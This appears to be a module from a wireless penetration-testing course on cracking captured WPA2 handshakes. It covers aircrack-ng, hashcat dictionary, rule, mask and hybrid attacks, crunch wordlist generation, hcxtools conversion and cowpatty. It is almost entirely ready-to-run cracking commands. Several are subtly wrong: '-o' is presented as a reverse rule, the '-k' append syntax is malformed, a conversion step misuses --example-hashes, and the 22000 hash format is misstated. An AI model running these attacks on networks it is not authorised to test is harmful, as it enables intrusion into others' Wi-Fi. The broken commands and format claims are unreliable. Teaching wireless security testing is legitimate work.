# Module 07 — WPA2 Cracking: Dictionary, Rule & Brute Force

> **Prerequisites:** [Module 06 — Capturing the WPA2 4-Way Handshake](../module-06-wpa2-handshake/)
> **Next Module:** [Module 08 — Deauthentication & Wireless DoS](../module-08-deauth-dos/)

---

## Table of Contents

1. [WPA2 Cracking Fundamentals](#1-wpa2-cracking-fundamentals)
2. [Dictionary Attacks](#2-dictionary-attacks)
3. [Using hashcat for GPU Acceleration](#3-using-hashcat-for-gpu-acceleration)
4. [Rule-Based Attacks](#4-rule-based-attacks)
5. [Mask Attacks](#5-mask-attacks)
6. [Wordlist Generation with crunch](#6-wordlist-generation-with-crunch)
7. [Converting Capture Files](#7-converting-capture-files)
8. [Cracking with Cowpatty](#8-cracking-with-cowpatty)
9. [Performance Optimization](#9-performance-optimization)
10. [Knowledge Check](#10-knowledge-check)

---

## 1. WPA2 Cracking Fundamentals

### Why WPA2 is Harder to Crack Than WEP

- **No static IV** — Each session uses unique keys
- **PBKDF2** — 4096 iterations of key derivation
- **Per-session keys** — Can't reuse captured data
- **Strong encryption** — AES-CCMP, not RC4

### The Cracking Process

```
1. Capture handshake (covered in Module 06)
2. Extract the hash (PMKID or EAPOL)
3. Try password candidates through PBKDF2
4. Compare computed MIC with captured MIC
5. If MIC matches, password is correct
```

### Hash Formats

| Format | Description | Tools |
|--------|-------------|-------|
| **PMKID** | Single hash from RSN PMKID | hashcat mode 22000 |
| **EAPOL** | Full handshake | hashcat mode 2500, aircrack-ng, cowpatty |
| **hccapx** | Binary format for hashcat | hcxtools conversion |

---

## 2. Dictionary Attacks

### Using aircrack-ng

```bash
# Basic dictionary attack
sudo aircrack-ng -w wordlist.txt handshake-01.cap

# With specific ESSID (if not detected)
sudo aircrack-ng -e MyNetwork -w wordlist.txt handshake-01.cap
```

### Wordlist Sources

- **RockYou** — ~14 million passwords (common)
- **SecLists** — Collection of multiple wordlists
- **Kali Linux** — `/usr/share/wordlists/`
- **Custom** — Based on target research

### Building Target-Specific Wordlists

```bash
# Use cupp to generate based on target info
cupp -i

# Or use crunch for patterns
crunch 8 12 -t password%% -o wordlist.txt
```

---

## 3. Using hashcat for GPU Acceleration

### Installation and Setup

```bash
# Install hashcat
sudo apt install hashcat

# Check hardware
hashcat -I
```

### Converting Capture to hashcat Format

```bash
# Using hcxtools (preferred)
hcxpcapngtool -o hash.txt capture.pcapng

# Or convert from hccapx
hashcat -m 2500 capture.hccapx --example-hashes
```

### Cracking Commands

```bash
# WPA2 PSK (mode 22000)
hashcat -m 22000 hash.txt wordlist.txt

# WPA2 PSK (legacy mode 2500)
hashcat -m 2500 capture.hccapx wordlist.txt

# With rules
hashcat -m 22000 hash.txt wordlist.txt -r rules/best64.rule
```

### GPU Performance

Modern GPUs can test:
- **RTX 4090**: ~1,000,000+ H/s
- **RTX 3080**: ~500,000 H/s  
- **RTX 2080**: ~400,000 H/s

This means a 1 billion password list would take:
- GPU: ~20 minutes
- CPU (aircrack-ng): ~1-2 days

---

## 4. Rule-Based Attacks

### What Are Rules?

Rules modify dictionary words to create variations:
- Append/prepend numbers
- Capitalize/le lowercase
- Leet speak substitutions (a→@, e→3)
- Common substitutions

### Popular Rule Sets

```bash
# Download rules
git clone https://github.com/jeanphorn/wordlist.git

# Use best64 rules
hashcat -m 22000 hash.txt wordlist.txt -r rules/best64.rule

# Use nsa-rules (aggressive)
hashcat -m 22000 hash.txt wordlist.txt -r rules/nsa-rules.txt
```

### Common Rule Commands

```bash
# Built-in rules
hashcat -m 22000 hash.txt wordlist.txt -j 'c'      # Capitalize
hashcat -m 22000 hash.txt wordlist.txt -k '$1 $2'   # Append
hashcat -m 22000 hash.txt wordlist.txt -o           # Reverse
```

### Creating Custom Rules

```
# myrules.rule
c
u
$1$2$3
s@4
```

---

## 5. Mask Attacks

### When to Use Masks

Masks try all combinations of character sets:
- When you know the password pattern
- When dictionary attacks fail
- For short, simple passwords

### Character Sets

```
?l = lowercase (a-z)
?u = uppercase (A-Z)
?d = digits (0-9)
?s = special (!@#$%^&*...)
?a = all (alphanumeric + special)
?b = binary
```

### Examples

```bash
# 8-digit numeric (phone numbers)
hashcat -m 22000 hash.txt -a 3 ?d?d?d?d?d?d?d?d

# 8-character alphanumeric lowercase
hashcat -m 22000 hash.txt -a 3 ?l?l?l?l?l?l?l?l

# Known pattern: password + 2 digits
hashcat -m 22000 hash.txt -a 3 password?d?d

# 10-character with mix
hashcat -m 22000 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d
```

### Hybrid Attacks

```bash
# Dictionary + mask (append 2 digits)
hashcat -m 22000 hash.txt wordlist.txt -a 6 ?d?d

# Mask + dictionary (prepend 3 chars)
hashcat -m 22000 hash.txt -a 7 ?l?l?l wordlist.txt
```

---

## 6. Wordlist Generation with crunch

### Basic Usage

```bash
# Generate all 8-character lowercase
crunch 8 8 -f /usr/share/crunch/charset.lst lalpha -o wordlist.txt

# Generate with specific characters
crunch 6 12 abc123ABC -o wordlist.txt
```

### Using Patterns

```bash
# Pattern: password followed by 2 digits
crunch 8 10 -t password%% -o wordlist.txt

# Pattern: capital + 5 lowercase + 2 digits
crunch 8 8 -t U@@@@@%% -o wordlist.txt

# Characters: @ = lowercase, , = uppercase, % = digit
```

### Piping to hashcat

```bash
# Direct pipe (no file creation)
crunch 8 12 | hashcat -m 22000 hash.txt
```

---

## 7. Converting Capture Files

### hcxpcapngtool (Recommended)

```bash
# Convert to hashcat 22000 format
hcxpcapngtool -o hash.txt capture.pcapng

# Include PMKID
hcxpcapngtool -o hash.txt capture.pcapng --pmkid

# Specific ESSID
hcxpcapngtool -o hash.txt -e MyNetwork capture.pcapng
```

### hcxtools

```bash
# Multiple conversion options
hcxpcaptool -o hash.txt capture.pcapng

# Extract to HCCAPX (for hashcat legacy)
hcxpcaptool -E essidlist.txt -o capture.hccapx capture.pcapng
```

### Checking Hash

```bash
# Show example hashes
hashcat -m 22000 --example-hashes

# Verify hash format
cat hash.txt | head -1
# Format: BSSID:HMAC:ESSID:WORDLIST
```

---

## 8. Cracking with Cowpatty

### Basic Usage

```bash
# Using wordlist
cowpatty -r handshake-01.cap -f wordlist.txt -s MyNetwork

# Using genpmk (precomputed PMK)
cowpatty -r handshake-01.cap -d precomputed.hash -s MyNetwork
```

### Precomputation with genpmk

```bash
# Generate PMK table for a wordlist
genpmk -f wordlist.txt -d precomputed.hash -s MyNetwork

# Then crack using precomputed table (much faster)
cowpatty -r handshake-01.cap -d precomputed.hash -s MyNetwork
```

### Performance Comparison

| Tool | Speed | Best For |
|------|-------|----------|
| aircrack-ng | ~10,000 H/s | CPU-only systems |
| hashcat | ~500,000+ H/s | GPU systems |
| cowpatty | ~15,000 H/s | Precomputed PMK tables |

---

## 9. Performance Optimization

### hashcat Optimization

```bash
# Show optimization modes
hashcat --help | grep -A5 "Optimization"

# Use optimized kernel
hashcat -m 22000 hash.txt -O wordlist.txt

# Workload optimization
# --workload-profile 1 = low, 2 = default, 3 = aggressive
hashcat -m 22000 hash.txt wordlist.txt --workload-profile 3
```

### Temperature Monitoring

```bash
# While cracking, monitor GPU temps
nvidia-smi -l 1

# Stop if temp exceeds 85°C
```

### Benchmarking

```bash
# Benchmark all algorithms
hashcat -b

# Benchmark specific mode
hashcat -m 22000 -b
```

---

## 10. Knowledge Check

Before proceeding to Module 08, you should be able to:

1. Explain why WPA2 is harder to crack than WEP. What computational steps are involved?
2. Write the command to crack a WPA2 handshake using aircrack-ng with a wordlist.
3. What hashcat mode number is used for WPA2 PSK handshakes (22000 or legacy 2500)?
4. What is the purpose of a rule-based attack? Give an example of a rule modification.
5. When would you use a mask attack instead of a dictionary attack?
6. Write a mask pattern to crack an 8-character password that starts with "admin" followed by digits.
7. How do you convert a pcap capture file to hashcat's 22000 format?
8. What are the advantages of using hashcat over aircrack-ng for WPA2 cracking?
9. Explain what a hybrid attack is and give a command example.
10. What temperature threshold should you avoid exceeding when cracking with GPU?

---

**Next:** [Module 08 — Deauthentication & Wireless DoS](../module-08-deauth-dos/)
